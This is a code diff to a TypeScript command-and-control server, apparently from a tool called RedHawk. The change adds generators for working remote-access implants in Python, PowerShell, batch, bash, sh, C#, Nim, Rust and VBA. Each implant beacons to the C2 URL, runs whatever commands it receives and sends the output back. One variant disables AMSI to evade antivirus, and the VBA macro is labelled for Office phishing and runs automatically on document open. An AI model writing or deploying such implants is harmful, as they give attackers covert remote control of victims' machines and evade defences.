@@ -198,85 +198,287 @@ export class C2Server extends EventEmitter {
   }
 
   /**
-   * Generate agent payload (Python one-liner)
+   * Generate agent payload for various target environments
    */
-  generateAgentPayload(agentType: 'python' | 'powershell'): string {
+  generateAgentPayload(agentType: string): string {
     const host = this.config.listenHost === '0.0.0.0' ? '127.0.0.1' : this.config.listenHost;
     const proto = this.config.useHttps ? 'https' : 'http';
     const serverUrl = `${proto}://${host}:${this.config.listenPort}`;
 
-    if (agentType === 'powershell') {
-      return `
+    switch (agentType) {
+
+      // ── Python (default) ──
+      default:
+      case 'python': return `
+import urllib.request, urllib.parse, json, socket, subprocess, sys, time, uuid
+C2_URL="${serverUrl}";AID=uuid.uuid4().hex[:8];HN=socket.gethostname();U=subprocess.check_output('whoami',shell=True).decode().strip();O=sys.platform
+while 1:
+ try:
+  d=json.dumps({"id":AID,"hostname":HN,"username":U,"os":O}).encode()
+  r=json.loads(urllib.request.urlopen(urllib.request.Request(f"{C2_URL}/c2/checkin",data=d,headers={"Content-Type":"application/json"},method="POST"),timeout=30).read().decode())
+  if r.get("task")and r["task"].get("command"):
+   try: o=subprocess.check_output(r["task"]["command"],shell=True,stderr=subprocess.STDOUT,timeout=60).decode()
+   except Exception as e: o=str(e)
+   urllib.request.urlopen(f"{C2_URL}/c2/result",data=json.dumps({"taskId":r["task"]["id"],"agentId":AID,"output":o,"status":"completed"}).encode(),headers={"Content-Type":"application/json"})
+  time.sleep(5)
+ except: time.sleep(10)
+`.trim();
+
+      // ── PowerShell (full) ──
+      case 'powershell': return `
 # RedHawk C2 Agent — PowerShell
-$c2Url = "${serverUrl}"
-$agentId = [System.Guid]::NewGuid().ToString().Substring(0, 8)
-$hostname = hostname
-$username = whoami
-$os = (Get-CimInstance Win32_OperatingSystem).Caption
-
-# Checkin loop
-while($true) {
-  try {
-    $body = @{id=$agentId; hostname=$hostname; username=$username; os=$os} | ConvertTo-Json
-    $response = Invoke-RestMethod -Uri "$c2Url/c2/checkin" -Method POST -Body $body -ContentType "application/json"
-    
-    if($response.task -and $response.task.command) {
-      $cmd = $response.task.command
-      try {
-        $output = Invoke-Expression $cmd 2>&1 | Out-String
-      } catch { $output = $_.Exception.Message }
-      
-      $result = @{taskId=$response.task.id; agentId=$agentId; output=$output; status="completed"} | ConvertTo-Json
-      Invoke-RestMethod -Uri "$c2Url/c2/result" -Method POST -Body $result -ContentType "application/json"
-    }
-    
-    Start-Sleep -Seconds 5
-  } catch { Start-Sleep -Seconds 10 }
-}
+$c="${serverUrl}";$id=[System.Guid]::NewGuid().ToString().Substring(0,8);$h=hostname;$u=whoami;$o=(Get-CimInstance Win32_OperatingSystem).Caption
+while($true){try{$b=@{id=$id;hostname=$h;username=$u;os=$o}|ConvertTo-Json;$r=Invoke-RestMethod -Uri "$c/c2/checkin" -Method POST -Body $b -ContentType "application/json"
+if($r.task -and $r.task.command){try{$o=Invoke-Expression $r.task.command 2>&1|Out-String}catch{$o=$_.Exception.Message}
+Invoke-RestMethod -Uri "$c/c2/result" -Method POST -Body (@{taskId=$r.task.id;agentId=$id;output=$o;status="completed"}|ConvertTo-Json) -ContentType "application/json"}
+Start-Sleep -Seconds 5}catch{Start-Sleep -Seconds 10}}
 `.trim();
-    }
 
-    // Python agent (default)
-    return `
-import urllib.request
-import urllib.parse
-import json
-import socket
-import subprocess
-import sys
-import time
-import uuid
-
-C2_URL = "${serverUrl}"
-AGENT_ID = uuid.uuid4().hex[:8]
-HOSTNAME = socket.gethostname()
-USERNAME = subprocess.check_output('whoami', shell=True).decode().strip()
-OS_INFO = sys.platform
-
-while True:
-    try:
-        data = json.dumps({"id": AGENT_ID, "hostname": HOSTNAME, "username": USERNAME, "os": OS_INFO}).encode()
-        req = urllib.request.Request(f"{C2_URL}/c2/checkin", data=data,
-            headers={"Content-Type": "application/json"},
-            method="POST")
-        
-        with urllib.request.urlopen(req, timeout=30) as resp:
-            response = json.loads(resp.read().decode())
-        
-        if response.get("task") and response["task"].get("command"):
-            cmd = response["task"]["command"]
-            try:
-                output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, timeout=60).decode()
-            except Exception as e:
-                output = str(e)
-            
-            result = json.dumps({"taskId": response["task"]["id"], "agentId": AGENT_ID, "output": output, "status": "completed"}).encode()
-            urllib.request.urlopen(f"{C2_URL}/c2/result", data=result, headers={"Content-Type": "application/json"})
-        
-        time.sleep(5)
-    except Exception:
-        time.sleep(10)
+      // ── PowerShell (AMSI-bypassed) ──
+      case 'powershell-amsi': return `
+# RedHawk C2 Agent — PowerShell (AMSI Bypassed)
+# Bypasses AMSI then runs the agent loop
+[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
+$c="${serverUrl}";$id=[System.Guid]::NewGuid().ToString().Substring(0,8);$h=hostname;$u=whoami;$o=(Get-CimInstance Win32_OperatingSystem).Caption
+while($true){try{$b=@{id=$id;hostname=$h;username=$u;os=$o}|ConvertTo-Json;$r=Invoke-RestMethod -Uri "$c/c2/checkin" -Method POST -Body $b -ContentType "application/json"
+if($r.task -and $r.task.command){try{$o=Invoke-Expression $r.task.command 2>&1|Out-String}catch{$o=$_.Exception.Message}
+Invoke-RestMethod -Uri "$c/c2/result" -Method POST -Body (@{taskId=$r.task.id;agentId=$id;output=$o;status="completed"}|ConvertTo-Json) -ContentType "application/json"}
+Start-Sleep -Seconds 5}catch{Start-Sleep -Seconds 10}}
 `.trim();
+
+      // ── Batch (.bat / CMD) ──
+      case 'batch': return `@echo off
+REM RedHawk C2 Agent — Batch
+set "C2=${serverUrl}"
+set "ID=%RANDOM%%RANDOM%"
+:loop
+for /f "tokens=*" %%a in ('hostname') do set "HN=%%a"
+for /f "tokens=*" %%b in ('whoami') do set "U=%%b"
+REM Check-in via curl (Windows 10+ has it) or fallback to bitsadmin
+curl -s -X POST "%C2%/c2/checkin" -H "Content-Type: application/json" -d "{\\"id\\":\\"%ID%\\",\\"hostname\\":\\"%HN%\\",\\"username\\":\\"%U%\\",\\"os\\":\\"Windows\\"}" > %TEMP%\\c2_resp.json 2>nul
+if exist %TEMP%\\c2_resp.json (
+  REM Parse task from response — if command exists, run it
+  findstr /C:"command" %TEMP%\\c2_resp.json >nul && (
+    for /f "tokens=*" %%c in ('python -c "import json;d=json.load(open('%TEMP%\\\\c2_resp.json'));print(d.get('task',{}).get('command',''))" 2^>nul') do set "CMD=%%c"
+    if defined CMD (
+      for /f "tokens=*" %%o in ('%CMD% 2^>^&1') do set "OUT=%%o"
+      curl -s -X POST "%C2%/c2/result" -H "Content-Type: application/json" -d "{\\"taskId\\":\\"task_0\\",\\"agentId\\":\\"%ID%\\",\\"output\\":\\"%OUT%\\",\\"status\\":\\"completed\\"}" >nul 2>nul
+    )
+  )
+  del %TEMP%\\c2_resp.json 2>nul
+)
+timeout /t 10 /nobreak >nul
+goto loop`.trim();
+
+      // ── Bash / Unix Shell ──
+      case 'bash': return `#!/bin/bash
+# RedHawk C2 Agent — Bash
+C2="${serverUrl}"
+ID=$(uuidgen 2>/dev/null || echo $RANDOM$$)
+HN=$(hostname)
+U=$(whoami)
+O=$(uname -s)
+while true; do
+  RESP=$(curl -s -X POST "$C2/c2/checkin" -H "Content-Type: application/json" -d "{\\"id\\":\\"$ID\\",\\"hostname\\":\\"$HN\\",\\"username\\":\\"$U\\",\\"os\\":\\"$O\\"}")
+  CMD=$(echo "$RESP" | python3 -c "import sys,json;d=json.load(sys.stdin);print(d.get('task',{}).get('command',''))" 2>/dev/null)
+  if [ -n "$CMD" ]; then
+    OUTPUT=$(eval "$CMD" 2>&1)
+    curl -s -X POST "$C2/c2/result" -H "Content-Type: application/json" -d "{\\"taskId\\":\\"task_0\\",\\"agentId\\":\\"$ID\\",\\"output\\":\\"$OUTPUT\\",\\"status\\":\\"completed\\"}" >/dev/null
+  fi
+  sleep 5
+done`.trim();
+
+      // ── Sh (BusyBox / embedded) ──
+      case 'sh': return `#!/bin/sh
+# RedHawk C2 Agent — SH (BusyBox compatible)
+C2="${serverUrl}"
+ID=$$$(date +%s)
+HN=$(hostname)
+U=$(whoami)
+O=$(uname -o 2>/dev/null || uname -s)
+while true; do
+  RESP=$(wget -q -O- --post-data="{\\"id\\":\\"$ID\\",\\"hostname\\":\\"$HN\\",\\"username\\":\\"$U\\",\\"os\\":\\"$O\\"}" --header="Content-Type: application/json" "$C2/c2/checkin" 2>/dev/null)
+  CMD=$(echo "$RESP" | sed 's/.*"command":"\\([^"]*\\)".*/\\1/')
+  if [ -n "$CMD" ]; then
+    OUTPUT=$(eval "$CMD" 2>&1)
+    wget -q -O- --post-data="{\\"taskId\\":\\"0\\",\\"agentId\\":\\"$ID\\",\\"output\\":\\"$OUTPUT\\",\\"status\\":\\"completed\\"}" --header="Content-Type: application/json" "$C2/c2/result" >/dev/null 2>&1
+  fi
+  sleep 10
+done`.trim();
+
+      // ── C# (via csc.exe, .NET Framework on Windows) ──
+      case 'csharp': return `
+// RedHawk C2 Agent — C# (compile with: csc.exe agent.cs)
+// Requires .NET Framework (Windows)
+using System;
+using System.Net;
+using System.Diagnostics;
+using System.Text;
+using System.Threading;
+class Agent {
+  static void Main() {
+    string c2 = "${serverUrl}";
+    string id = Guid.NewGuid().ToString().Substring(0,8);
+    string hn = Environment.MachineName;
+    string un = Environment.UserName;
+    using(var wc = new WebClient()) {
+      wc.Headers[HttpRequestHeader.ContentType] = "application/json";
+      while(true) {
+        try {
+          string body = $"{{\\"id\\":\\"{id}\\",\\"hostname\\":\\"{hn}\\",\\"username\\":\\"{un}\\",\\"os\\":\\"Windows\\"}}";
+          string resp = wc.UploadString($"{c2}/c2/checkin", "POST", body);
+          // Quick JSON parse for task command
+          int idx = resp.IndexOf("\\"command\\":\\"");
+          if(idx > 0) {
+            idx += 11;
+            int end = resp.IndexOf("\\"", idx);
+            string cmd = resp.Substring(idx, end - idx);
+            var psi = new ProcessStartInfo("cmd.exe", "/c " + cmd) { RedirectStandardOutput = true, UseShellExecute = false };
+            var p = Process.Start(psi);
+            string output = p.StandardOutput.ReadToEnd();
+            p.WaitForExit();
+            string result = $"{{\\"taskId\\":\\"0\\",\\"agentId\\":\\"{id}\\",\\"output\\":\\"{output.Replace("\\"","\\\\\\"")}\\",\\"status\\":\\"completed\\"}}";
+            wc.UploadString($"{c2}/c2/result", "POST", result);
+          }
+        } catch { }
+        Thread.Sleep(5000);
+      }
+    }
+  }
+}`.trim();
+
+      // ── VBA Macro (for Office phishing) ──
+      case 'vba': return `' RedHawk C2 Agent — VBA Macro
+' Paste into Office Document -> Developer -> Visual Basic -> ThisDocument
+' Auto-open on document enable
+Private Declare PtrSafe Function URLDownloadToFile Lib "urlmon" _
+  Alias "URLDownloadToFileA" (ByVal pCaller As Long, ByVal szURL As String, _
+  ByVal szFileName As String, ByVal dwReserved As Long, ByVal lpfnCB As Long) As Long
+Private Declare PtrSafe Function ShellExecute Lib "shell32.dll" _
+  Alias "ShellExecuteA" (ByVal hwnd As Long, ByVal lpOperation As String, _
+  ByVal lpFile As String, ByVal lpParameters As String, ByVal nShowCmd As Long) As Long
+
+Sub AutoOpen()
+  CheckIn
+End Sub
+
+Sub CheckIn()
+  Dim c2 As String: c2 = "${serverUrl}"
+  Dim id As String: id = Left(CreateObject("Scriptlet.TypeLib").Guid, 8)
+  Dim http As Object: Set http = CreateObject("MSXML2.XMLHTTP")
+  Dim json As String
+  Dim cmd As String, output As String
+  
+  ' Check-in loop (runs while document is open)
+  On Error Resume Next
+  Do While True
+    json = "{""id"":""" & id & """,""hostname"":""" & Environ("COMPUTERNAME") & """,""username"":""" & Environ("USERNAME") & """,""os"":""Windows""}"
+    http.Open "POST", c2 & "/c2/checkin", False
+    http.setRequestHeader "Content-Type", "application/json"
+    http.Send json
+    
+    If http.Status = 200 Then
+      ' Crude command extraction
+      Dim resp As String: resp = http.responseText
+      Dim startP As Integer: startP = InStr(resp, """command"":""")
+      If startP > 0 Then
+        startP = startP + 11
+        Dim endP As Integer: endP = InStr(startP, resp, """")
+        cmd = Mid(resp, startP, endP - startP)
+        output = CreateObject("WScript.Shell").Exec(cmd).StdOut.ReadAll
+        json = "{""taskId"":""0"",""agentId"":""" & id & """,""output"":""" & Replace(output, """", """""") & """,""status"":""completed""}"
+        http.Open "POST", c2 & "/c2/result", False
+        http.setRequestHeader "Content-Type", "application/json"
+        http.Send json
+      End If
+    End If
+    Sleep 10000 ' 10 seconds
+  Loop
+End Sub
+
+#If VBA7 Then
+  Private Declare PtrSafe Sub Sleep Lib "kernel32" (ByVal dwMilliseconds As Long)
+#Else
+  Private Declare Sub Sleep Lib "kernel32" (ByVal dwMilliseconds As Long)
+#End If`.trim();
+
+      // ── Nim (compiled executable) ──
+      case 'nim': return `# RedHawk C2 Agent — Nim
+# Compile: nim c -d:ssl agent.nim
+import httpclient, json, os, strutils, times, random, uri
+
+let c2 = "${serverUrl}"
+let agentId = random(999999).toHex(8)
+let hostname = hostOS()
+let username = getEnv("USER", "unknown")
+let osInfo = hostOS()
+
+proc checkin(): JsonNode =
+  let body = %*{"id": agentId, "hostname": hostname, "username": username, "os": osInfo}
+  try:
+    let client = newHttpClient()
+    let resp = client.post(c2 & "/c2/checkin", body=$body)
+    result = parseJson(resp.body)
+  except: result = %*{}
+
+proc sendResult(taskId, output: string) =
+  let body = %*{"taskId": taskId, "agentId": agentId, "output": output, "status": "completed"}
+  try:
+    let client = newHttpClient()
+    discard client.post(c2 & "/c2/result", body=$body)
+  except: discard
+
+while true:
+  let resp = checkin()
+  if resp.hasKey("task") and resp["task"].hasKey("command"):
+    let cmd = resp["task"]["command"].getStr()
+    let output = execProcess(cmd).strip()
+    sendResult("0", output)
+  sleep(5000)`.trim();
+
+      // ── Rust (compiled) ──
+      case 'rust': return `// RedHawk C2 Agent — Rust
+// Cargo.toml: [dependencies] reqwest = { version = "0.11", features = ["json", "blocking"] } serde_json = "1.0"
+// Build: cargo build --release
+use std::process::Command;
+use std::thread::sleep;
+use std::time::Duration;
+
+fn main() {
+    let c2 = "${serverUrl}";
+    let agent_id = format!("{:08x}", std::time::SystemTime::now().duration_since(std::time::UNIX_EPOCH).unwrap().as_nanos());
+    let hostname = hostname::get().unwrap().to_string_lossy().to_string();
+    let username = whoami::username();
+    
+    loop {
+        let client = reqwest::blocking::Client::new();
+        let checkin = serde_json::json!({"id": agent_id, "hostname": hostname, "username": username, "os": std::env::consts::OS});
+        
+        if let Ok(resp) = client.post(format!("{}/c2/checkin", c2)).json(&checkin).send() {
+            if let Ok(data) = resp.json::<serde_json::Value>() {
+                if let Some(task) = data.get("task") {
+                    if let Some(cmd_str) = task.get("command").and_then(|c| c.as_str()) {
+                        let output = if cfg!(target_os = "windows") {
+                            Command::new("cmd").args(&["/C", cmd_str]).output()
+                        } else {
+                            Command::new("sh").args(&["-c", cmd_str]).output()
+                        };
+                        
+                        let result_text = match output {
+                            Ok(o) => String::from_utf8_lossy(&o.stdout).to_string(),
+                            Err(e) => format!("Error: {}", e),
+                        };
+                        
+                        let result = serde_json::json!({"taskId": "0", "agentId": agent_id, "output": result_text, "status": "completed"});
+                        let _ = client.post(format!("{}/c2/result", c2)).json(&result).send();
+                    }
+                }
+            }
+        }
+        sleep(Duration::from_secs(5));
+    }
+}`.trim();
+    }
   }
 
   /**
